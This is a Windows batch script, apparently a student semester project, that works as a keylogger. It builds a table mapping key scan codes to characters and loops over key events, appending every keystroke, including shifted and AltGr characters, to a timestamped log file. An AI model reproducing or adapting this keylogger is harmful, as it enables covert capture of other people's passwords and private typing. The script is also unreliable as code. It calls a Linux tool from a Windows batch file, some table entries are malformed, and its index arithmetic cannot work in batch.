@echo off
setlocal EnableDelayedExpansion

REM Déclaration du tableau associatif
set "teclas[01]=<ESC>"
set "teclas[02]=1"
set "teclas[03]=2"
set "teclas[04]=3"
set "teclas[05]=4"
set "teclas[06]=5"
set "teclas[07]=6"
set "teclas[08]=7"
set "teclas[09]=8"
set "teclas[10]=9"
set "teclas[11]=0"
set "teclas[12]=<minus>"
set "teclas[13]=<equal>"
set "teclas[14]=<BackSpace>"
set "teclas[15]=<Tab>"
set "teclas[16]=qQ"
set "teclas[17]=wW"
set "teclas[18]=eE"
set "teclas[19]=rR"
set "teclas[20]=tT"
set "teclas[21]=yY"
set "teclas[22]=uU"
set "teclas[23]=iI"
set "teclas[24]=oO"
set "teclas[25]=pP"
set "teclas[26]=Bracketleft"
set "teclas[27]=Bracketright"
set "teclas[28]=Return(enter)"
set "teclas[29]=<Control_L>"
set "teclas[30]=aA"
set "teclas[31]=sS"
set "teclas[32]=dD"
set "teclas[33]=fF"
set "teclas[34]=gG"
set "teclas[35]=hH"
set "teclas[36]=jJ"
set "teclas[37]=kK"
set "teclas[38]=lL"
set "teclas[39]=)"
set "teclas[40]=Apostrophe"
set "teclas[41]=º"
set "teclas[42]=<Shift_L>"
set "teclas[43]=Backslash(\)"
set "teclas[44]=zZ"
set "teclas[45]=xX"
set "teclas[46]=cC"
set "teclas[47]=vV"
set "teclas[48]=bB"
set "teclas[49]=nN"
set "teclas[50]=mM"
set "teclas[51]=,"
set "teclas[52]=."
set "teclas[53]=-"
set "teclas[54]=<Shift_R>"
set "teclas[55]=KP_Multiply"
set "teclas[56]=<Alt_key>"
set "teclas[57]=<Space( )>"
set "teclas[58]=<Caps_Lock>"
set "teclas[59]=F1"
set "teclas[60]=F2"
set "teclas[61]=F3"
set "teclas[62]=F4"
set "teclas[63]=F5"
set "teclas[64]=F6"
set "teclas[65]=F7"
set "teclas[66]=F8"
set "teclas[67]=F9"
set "teclas[68]=F10"
set "teclas[69]=<Num_Lock>"
set "teclas[70]=<Scroll_Lock>"
set "teclas[71]=KP_Home"
set "teclas[72]=KP_Up"
set "teclas[73]=KP_Prior"
set "teclas[74]=KP_Subtract"
set "teclas[75]=KP_Left"
set "teclas[76]=KP_Begin"
set "teclas[77]=KP_Right"
set "teclas[78]=KP_Add"
set "teclas[79]=KP_End"
set "teclas[80]=KP_Down"
set "teclas[81]=KP_Next"
set "teclas[82]=KP_Insert"
set "teclas[83]=KP_Delete"
set "teclas[86]=less"
set "teclas[87]=F11"
set "teclas[88]=F12"
set "teclas[100]=<AltGraph>"
set "teclas[102]=|"
set "teclas[103]=@"
set "teclas[104]=#"
set "teclas[105]=~"
set "teclas[106]=½"
set "teclas[107]=¬"
set "teclas[108]={"
set "teclas[109]=["
set "teclas[110]=]"
set "teclas[111]=}"
set "teclas[126]="
set "teclas[127]="
set "teclas[140]={"
set "teclas[141]=\\"
set "teclas[143]=}"
set "teclas[156]=!"
set "teclas[157]=\""
set "teclas[158]=·"
set "teclas[159]=$"
set "teclas[160]=%%"
set "teclas[161]=&"
set "teclas[162]=/"
set "teclas[163]=( "
set "teclas[164]) "
set "teclas[165]="="

set "FILE=C:\COURS\A_T_E_L_projetfindesemestre\stock\teclas_%date:~0,2%-%date:~3,2%-%date:~6,4%-%time:~0,2%.%time:~3,2%"

echo ==================== %date% %time% =====================>> "%FILE%"

REM Fonction logger
:logger
for /f "delims=" %%i in ('showkey') do set "linea=%%i" & goto process

:process
for /f "tokens=4,5" %%a in ("%linea%") do (
    set "t=%%a"
    set "estado=%%b"
)
if %t%==42 set "SHIFT=true"
if %t%==54 set "SHIFT=true"
if %t%==58 if %estado%==pulsada echo <CAPS o MAYS Pulsado> >> "%FILE%"
if %t%==58 if not %estado%==pulsada echo <CAPS o MAYS liberado> >> "%FILE%"
if %t%==28 if %estado%==pulsada echo. >> "%FILE%"
if %t%==57 if %estado%==pulsada echo. >> "%FILE%"
if %t%==100 if %estado%==pulsada set "altgraph=true"
if %t%==100 if not %estado%==pulsada set "altgraph=false"
if %t%==14 if %estado%==pulsada echo <BackSpace> >> "%FILE%"
if %t% LSS 100 if %t% GTR 9 (
    if %estado%==pulsada (
        if !altgraph! == true (
            for /f %%T in ("!t!") do echo !teclas[%%T+100]! >> "%FILE%"
            goto :continue
        )
        if !SHIFT! == true (
            for /f %%T in ("!t!") do echo !teclas[%%T+154]! >> "%FILE%"
            goto :continue
        )
        if !t! LSS 10 (
            echo !teclas[0!t!]! >> "%FILE%"
            goto :continue
        ) else (
            echo !teclas[%t%]! >> "%FILE%"
            goto :continue
        )
    )
) else (
    if %estado%==pulsada (
        if !SHIFT! == false (
            echo !teclas[%t%]:~0,1! >> "%FILE%"
            goto :continue
        )
        if !SHIFT! == true (
            echo !teclas[%t%]:~1,1! >> "%FILE%"
            goto :continue
        )
    )
)

:continue
goto logger
